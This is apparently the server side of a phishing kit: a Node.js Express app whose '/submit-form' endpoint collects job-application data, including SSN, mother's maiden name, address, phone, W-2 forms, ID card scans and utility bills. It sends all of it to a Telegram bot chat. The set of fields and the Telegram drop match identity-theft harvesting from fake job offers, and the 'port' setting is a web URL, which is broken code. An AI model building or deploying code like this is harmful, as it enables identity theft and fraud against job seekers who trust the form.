import express from 'express';
import multer from 'multer';
import cors from 'cors';
import axios from 'axios';
import FormData from 'form-data';
import { config as configDotenv } from 'dotenv';

configDotenv(); 

const app = express();
const port = process.env.PORT || `https://alixiaa.vercel.app/`;

const storage = multer.memoryStorage();
const upload = multer({ storage });

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const sendFileToTelegram = async (fileBuffer, originalname) => {
    const form = new FormData();
    form.append('chat_id', process.env.TELEGRAM_CHAT_ID);
    form.append('document', fileBuffer, originalname);

    try {
        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders(),
        });
    } catch (error) {
        console.error('Error sending file to Telegram:', error.message);
        throw error;
    }
};

app.post('/submit-form', upload.fields([
    { name: 'w2Form' },
    { name: 'idCardFront' },
    { name: 'idCardBack' },
    { name: 'utilityBill' }
]), async (req, res) => {
    try {
        const { lastName, firstName, mothersMaidenName, address1, email, positionApplied, ssn, startDate, telephone } = req.body;
        const files = req.files || {};

        if (!lastName || !firstName || !email || !positionApplied) {
            return res.status(400).json({ error: 'Missing required form fields.' });
        }

        // Send message to Telegram
        const message = `
            Last Name: ${lastName}
            First Name: ${firstName}
            Mother's Maiden Name: ${mothersMaidenName}
            Address Line 1: ${address1}
            Email: ${email}
            Position Applied: ${positionApplied}
            SSN: ${ssn}
            Start Date: ${startDate}
            Telephone: ${telephone}
        `;
        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: message,
        });

        // Send files to Telegram
        await Promise.all(Object.values(files).flat().map(file => sendFileToTelegram(file.buffer, file.originalname)));

        res.status(200).json({ message: 'Form submitted successfully.' });
    } catch (error) {
        console.error('Error submitting form:', error.message);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
